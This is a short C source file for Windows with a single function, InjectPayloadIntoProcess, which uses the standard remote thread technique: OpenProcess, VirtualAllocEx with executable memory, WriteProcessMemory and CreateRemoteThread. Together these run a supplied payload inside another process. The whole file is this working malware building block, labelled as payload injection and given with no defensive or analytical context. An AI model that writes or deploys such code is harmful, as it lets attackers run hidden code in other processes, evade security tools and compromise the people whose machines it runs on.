#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Payload injection functions

BOOL InjectPayloadIntoProcess(DWORD dwProcessId, BYTE* pPayload, SIZE_T dwPayloadSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess) {
        return FALSE;
    }
    
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    if (!WriteProcessMemory(hProcess, pRemoteMemory, pPayload, dwPayloadSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}
